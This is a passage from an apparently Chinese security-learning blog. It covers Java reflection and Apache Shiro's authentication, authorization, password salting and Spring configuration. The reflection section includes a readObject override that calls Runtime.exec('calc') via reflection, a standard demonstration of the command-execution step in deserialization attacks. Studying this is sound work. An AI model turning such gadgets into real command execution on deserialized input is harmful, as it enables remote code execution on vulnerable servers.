<p>我们最终需要的是利用反射机制调用方法 使用invoke<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class RefUser&#123;</span><br><span class="line">	public int sub(int a,int b)&#123;</span><br><span class="line">        return a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ReflectionMain&#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        </span><br><span class="line">        Class c = RefUser.class;</span><br><span class="line">        //创建实例</span><br><span class="line">        RefUser test = (RefUser) c.newInstance();</span><br><span class="line">        </span><br><span class="line">        //获取add方法</span><br><span class="line">        Method m = c.getMethod(&quot;sub&quot;,new Class[]&#123;int.class,int.class&#125;);</span><br><span class="line">		</span><br><span class="line">        //调用方法  sub(1,2)</span><br><span class="line">        Object result = m.invoke(test,1,2);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>重写readObject 弹个计算器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class ReflectCalcObject implements Serializable &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void readObject()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Method m = java.lang.Runtime.class.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">            m.invoke(Runtime.getRuntime(),&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过运行java.lang.Runtime的.class属性，并使用getMethod方法来获取我们要执行的命令的exec方法，最后通过invoke来注册这个方法并传入参数calc<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.17.09.02-image.png" alt="2019-03-31.17.09.02-image.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/03/Shiro安全框架入门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/03/Shiro安全框架入门/" itemprop="url">Shiro安全框架入门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-03T08:15:41+08:00">
                2019-03-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>在针对那个SSM项目的漏洞未授权漏洞进行修复时,搜到了这个Shiro,特找资料学习了一番,记录一波。</p>
</blockquote>
<hr>
<h1 id="Shiro安全框架入门"><a href="#Shiro安全框架入门" class="headerlink" title="Shiro安全框架入门"></a>Shiro安全框架入门</h1><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><blockquote>
<p>Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.<br>Apache Shiro™是一个强大且易用的Java安全框架,能够用于身份验证、授权、加密和会话管理。Shiro拥有易于理解的API,您可以快速、轻松地获得任何应用程序——从最小的移动应用程序到最大的网络和企业应用程序。</p>
</blockquote>
<p>简而言之,Apache Shiro是一个Java的安全框架。</p>
<h2 id="Shiro的作用"><a href="#Shiro的作用" class="headerlink" title="Shiro的作用"></a>Shiro的作用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">验证用户身份			</span><br><span class="line">访问权限控制		</span><br><span class="line">可以响应认证,或者是Session生命周期发生的时间		</span><br><span class="line">支持单点登陆(SSO)			</span><br><span class="line">支持Remember me服务,获取用户关联信息而无需登陆</span><br></pre></td></tr></table></figure>
<h2 id="Shiro基础"><a href="#Shiro基础" class="headerlink" title="Shiro基础"></a>Shiro基础</h2><h3 id="框架图"><a href="#框架图" class="headerlink" title="框架图"></a>框架图</h3><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.18.46.25-image.png" alt="2019-03-03.18.46.25-image.png"><br>Authentication，Authorizer，SessionManager，Cryptography被开发团队称为四大应用安全基石。                </p>
<p><strong>Authentication(认证器)</strong>:对用户身份进行认证，Authenticator是一个接口，shiro提供ModularRealmAuthenticator实现类,通过其可以满足大部分需求(也可自行定义)。            </p>
<p><strong>Authorizer(授权器)</strong>:用户通过认证器认证通过,在访问功能时需要通过授权器判断当前登陆用户是否具有操作权限。            </p>
<p><strong>SessionManager</strong>:即会话管理，Shiro框架定义了一套会话管理,它不依赖于Web容器的session，所以shiro可以使用在非web应用上。            </p>
<p><strong>Cryptography</strong>:即密码管理,shiro提供了一套加密/解密的组件，方便开发</p>
<h3 id="概念层理念"><a href="#概念层理念" class="headerlink" title="概念层理念"></a>概念层理念</h3><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.18.57.27-image.png" alt="2019-03-03.18.57.27-image.png"><br>核心组件:Subject SecurityManager Realms<br><strong>Subject</strong>主体,Subject可以是一个人或一个程序或者其他–当前与软件交互的任何事件。<br><strong>SecurityManager</strong>:安全管理器，管理所有的Subject,他是shiro的核心，负责对所有的subject进行安全管理。通过SecurityManager可以完成subject的认证及授权等，实质上Security是通过Authentication进行认证,通过Authorizer进行授权,通过SessionManager进行会话管理。<strong>SecurityManager是一个接口</strong>,继承了<code>Authenticator,Authorizer,SessionManager</code>这三个接口。<br><strong>Realm</strong>:用于进行权限信息的验证,我们自己实现。Realm本质上是一个特定的安全DAO:它封装与数据库连接的细节,得到Shiro所需的相关数据。在配置Shiro的时候，必须指定至少一个Realm来实现认证和授权。在自定义的Realm中,我们需要实现Realm的Authentication(身份验证) 和 Authorization(授权访问控制)，用于对用户进行的操作授权。</p>
<p><strong>Shiro不会去维护用户、维护权限；这些需要我们自己去设计/提供；然后通过相应的接口注入给Shiro即可。</strong><br>最简单的Shiro Demo：<br>1、应用代码通过Subject来进行认证和授权，而Subject又委托给SecurityManager；<br>2、我们需要给Shiro的SecurityManager注入Realm，从而让SecurityManager能得到合法的用户及其权限进行判断。<br>从上我们可以看出，Shiro不提供认证和授权，而是通过Realm让开发人员自己注入。    </p>
<h2 id="Shiro认证过程"><a href="#Shiro认证过程" class="headerlink" title="Shiro认证过程"></a>Shiro认证过程</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.15.31.00-image.png" alt="2019-03-03.15.31.00-image.png"></p>
<p>代码理解:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">public class AuthenticationTest &#123;</span><br><span class="line"></span><br><span class="line">    SimpleAccountRealm accountRealm = new SimpleAccountRealm();;</span><br><span class="line"></span><br><span class="line">    @Before</span><br><span class="line">    public void addUser()&#123;</span><br><span class="line">        accountRealm.addAccount(&quot;test&quot;,&quot;123456&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void testAuthentication()&#123;</span><br><span class="line">        //1.构建DefaultSecurityManager环境</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(accountRealm);</span><br><span class="line"></span><br><span class="line">        //2.主体提交认证请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;test&quot;,&quot;123456&quot;);</span><br><span class="line">        subject.login(token);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;isAuthenticated:&quot;+subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line">        subject.logout();</span><br><span class="line">	 System.out.println(&quot;isAuthenticated:&quot;+subject.isAuthenticated());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>结果:依次输出isAuthenticated:true与isAuthenticated:false</strong>（表示认证成功与认证失败）。                </p>
<p>再抛出一张图方便理解:            </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.19.31.13-image.png" alt="2019-03-03.19.31.13-image.png"><br>1.调用Subject.login(token)进行登陆,会自动委托给Security Manager，调用之前必须通过<code>SecurityUtils.setSecurityManager()</code>设置;<br>2.SecurityManager负责真正的业务逻辑处理,它会委托Authenticator进行身份认证。(通过跟进login()方法即了解)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.42.14-image.png" alt="2019-03-03.20.42.14-image.png"><br>3.Authenticator才是真正的身份验证者,Shiro Api中核心的身份认证入口点,此处可定义插入自己的实现。<br>4.Authenticator 可能会委托给相应的 AuthenticationStrategy 进行多 Realm 身份验证，默认 ModularRealmAuthenticator 会调用 AuthenticationStrategy 进行多 Realm 身份验证<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.44.01-image.png" alt="2019-03-03.20.44.01-image.png"><br>5.Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问</p>
<h2 id="Shiro授权过程"><a href="#Shiro授权过程" class="headerlink" title="Shiro授权过程"></a>Shiro授权过程</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.02.08-image.png" alt="2019-03-03.20.02.08-image.png"></p>
<blockquote>
<p><strong>在登录成功后，根据用户id获取到该用户的权限，并把权限保存在安全管理器之中，当用户访问的时候，会从管理器中判断该用户是否有权限去访问该url。</strong></p>
</blockquote>
<p>代码理解:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">public class AuthenticationTest &#123;</span><br><span class="line"></span><br><span class="line">    SimpleAccountRealm accountRealm = new SimpleAccountRealm();;</span><br><span class="line"></span><br><span class="line">    @Before</span><br><span class="line">    public void addUser()&#123;</span><br><span class="line">        accountRealm.addAccount(&quot;test&quot;,&quot;123456&quot;,&quot;admin&quot;,&quot;user&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void testAuthentication()&#123;</span><br><span class="line">        //1.构建DefaultSecurityManager环境</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(accountRealm);</span><br><span class="line"></span><br><span class="line">        //2.主体提交认证请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();//获取当前主体</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;test&quot;,&quot;123456&quot;);</span><br><span class="line">        subject.login(token);</span><br><span class="line"></span><br><span class="line">     System.out.println(&quot;isAuthenticated:&quot;+subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line">        subject.checkRoles(&quot;admin&quot;,&quot;user&quot;);  //正确</span><br><span class="line">        //subject.checkRole(&quot;admin1&quot;);  报错</span><br><span class="line">        //subject.checkRoles(&quot;admin&quot;,&quot;user1&quot;); 报错</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行测试可看到效果。<br>执行过程与认证大体类似<br>1.调用<code>subject.checkRoles(&quot;admin&quot;,&quot;user&quot;);</code>进行角色检查,会自动委托给Security Manager，调用之前必须通过<code>SecurityUtils.setSecurityManager()</code>设置<br>2.SecurityManager执行授权，通过ModularRealmAuthorizer执行授权<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.56.36-image.png" alt="2019-03-03.20.56.36-image.png"><br>3.ModularRealmAuthorizer执行DatabaseRealm从数据库查询权限数据<br>（调用DatabaseRealm的授权方法:doGetAuthorizationInfo(principalCollection)）<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.55.02-image.png" alt="2019-03-03.20.55.02-image.png"><br>4.DatabaseRealm从数据库中查到权限数据，返回ModularRealmAuthorizer<br>5.ModularRealmAuthorizer调用PermissionResolver进行权限比对<br>6.如果比对后，isPermitted中”permission串”在realm查询到权限数据中，说明用户访问permission串有权限，否则 没有权限，抛出异常。            </p>
<h2 id="Shiro加密"><a href="#Shiro加密" class="headerlink" title="Shiro加密"></a>Shiro加密</h2><h2 id="普通加密"><a href="#普通加密" class="headerlink" title="普通加密"></a>普通加密</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.14.33.21-image.png" alt="2019-03-02.14.33.21-image.png"><br>上面的123经过Md5加密后,得到的字符串：<br><code>202cb962ac59075b964b07152d234b70</code>就无法通过计算还原回<code>123</code>,那我们就可以把这个值存放在数据库中,当用户登陆时,先进行Md5加密,再与数据库中的密码进行比对,保证了一定的安全性。但是:<code>虽然无法通过直接计算反推到密码，但是我们仍然可以通过计算出常用的密码的Md5值,然后去对比也可以知道原密码是多少。</code>为了解决这个问题,引入了<strong>盐</strong>的概念。        </p>
<h3 id="加盐-多次加密"><a href="#加盐-多次加密" class="headerlink" title="加盐+多次加密"></a>加盐+多次加密</h3><p>既然相同的密码md5一样,我们就让我们的原始密码加上一<strong>个随机数</strong>,再进行Md5加密,这个随机数就是我们说的<strong>盐</strong>,当然我们也要把用户对应的盐放入数据库,以便我们进行验证。        另外我们也可以通过多次加密的方式,即使大黑阔通过一定手段拿到我们的密码Md5值,但他并不知道我们加密了多少次,破解门槛变高。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.15.22.20-image.png" alt="2019-03-02.15.22.20-image.png"></p>
<h2 id="SSM简单实例"><a href="#SSM简单实例" class="headerlink" title="SSM简单实例"></a>SSM简单实例</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>web.xml做了几件事情:<br>1.指定Spring的配置文件<code>applicationContext.xml(连接数据库)与applicationContext-shiro.xml(配置shiro的)</code></p>
<pre><code>&lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
</code></pre><p>2.指定springmvc的配置文件：</p>
<pre><code>&lt;init-param&gt;
            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
            &lt;param-value&gt;classpath:springMVC.xml&lt;/param-value&gt;
        &lt;/init-param&gt;
</code></pre><p>3.使用shiro过滤器:        </p>
<pre><code>&lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
</code></pre><h3 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h3><p>1.配置数据库的相关信息<br>2.扫描mapper类<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.19.45-image.png" alt="2019-03-02.20.19.45-image.png"></p>
<h3 id="applicationContext-shiro-xml"><a href="#applicationContext-shiro-xml" class="headerlink" title="applicationContext-shiro.xml"></a>applicationContext-shiro.xml</h3><p>提供shiro的相关配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">	   xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:util=&quot;http://www.springframework.org/schema/util&quot;</span><br><span class="line">	   xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">	   xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">	   xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">	   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">	http://www.springframework.org/schema/beans/spring-beans-4.0.xsd http://www.springframework.org/schema/tx</span><br><span class="line">	http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context</span><br><span class="line">	http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/mvc</span><br><span class="line">	http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/aop</span><br><span class="line">	http://www.springframework.org/schema/aop/spring-aop-4.0.xsd http://www.springframework.org/schema/util</span><br><span class="line">	http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;!-- 配置shiro的过滤器工厂类，id- shiroFilter要和我们在web.xml中配置的过滤器一致 --&gt;</span><br><span class="line">	&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">		&lt;!-- 调用我们配置的权限管理器 --&gt;</span><br><span class="line">		&lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">		&lt;!-- 配置我们的登录请求地址 --&gt;</span><br><span class="line">		&lt;property name=&quot;loginUrl&quot; value=&quot;/login&quot; /&gt;</span><br><span class="line">		&lt;!-- 如果您请求的资源不再您的权限范围，则跳转到/403请求地址 --&gt;</span><br><span class="line">		&lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized&quot; /&gt;</span><br><span class="line">		&lt;!-- 退出 --&gt;</span><br><span class="line">		&lt;property name=&quot;filters&quot;&gt;</span><br><span class="line">			&lt;util:map&gt;</span><br><span class="line">				&lt;entry key=&quot;logout&quot; value-ref=&quot;logoutFilter&quot; /&gt;</span><br><span class="line">			&lt;/util:map&gt;</span><br><span class="line">		&lt;/property&gt;</span><br><span class="line">		&lt;!-- 权限配置 --&gt;</span><br><span class="line">		&lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">			&lt;value&gt;</span><br><span class="line">				&lt;!-- anon表示此地址不需要任何权限即可访问 --&gt;</span><br><span class="line">				/login=anon</span><br><span class="line">				/index=anon</span><br><span class="line">				/static/**=anon</span><br><span class="line">				/doLogout=logout</span><br><span class="line">				&lt;!--所有的请求(除去配置的静态资源请求或请求地址为anon的请求)都要通过登录验证,如果未登录则跳到/login --&gt;</span><br><span class="line">				/** = authc</span><br><span class="line">			&lt;/value&gt;</span><br><span class="line">		&lt;/property&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 退出过滤器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;logoutFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.LogoutFilter&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;redirectUrl&quot; value=&quot;/index&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!-- 会话ID生成器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionIdGenerator&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGenerator&quot; /&gt;</span><br><span class="line">	&lt;!-- 会话Cookie模板 关闭浏览器立即失效 --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionIdCookie&quot; class=&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt;</span><br><span class="line">		&lt;constructor-arg value=&quot;sid&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;httpOnly&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;maxAge&quot; value=&quot;-1&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 会话DAO --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionDAO&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAO&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;sessionIdGenerator&quot; ref=&quot;sessionIdGenerator&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 会话验证调度器，每30分钟执行一次验证 ，设定会话超时及保存 --&gt;</span><br><span class="line">	&lt;bean name=&quot;sessionValidationScheduler&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.session.mgt.ExecutorServiceSessionValidationScheduler&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;interval&quot; value=&quot;1800000&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 会话管理器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionManager&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt;</span><br><span class="line">		&lt;!-- 全局会话超时时间（单位毫秒），默认30分钟 --&gt;</span><br><span class="line">		&lt;property name=&quot;globalSessionTimeout&quot; value=&quot;1800000&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;deleteInvalidSessions&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionValidationSchedulerEnabled&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionValidationScheduler&quot; ref=&quot;sessionValidationScheduler&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionDAO&quot; ref=&quot;sessionDAO&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionIdCookieEnabled&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionIdCookie&quot; ref=&quot;sessionIdCookie&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;!-- 安全管理器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;realm&quot; ref=&quot;databaseRealm&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 相当于调用SecurityUtils.setSecurityManager(securityManager) --&gt;</span><br><span class="line">	&lt;bean</span><br><span class="line">			class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;staticMethod&quot;</span><br><span class="line">				  value=&quot;org.apache.shiro.SecurityUtils.setSecurityManager&quot; 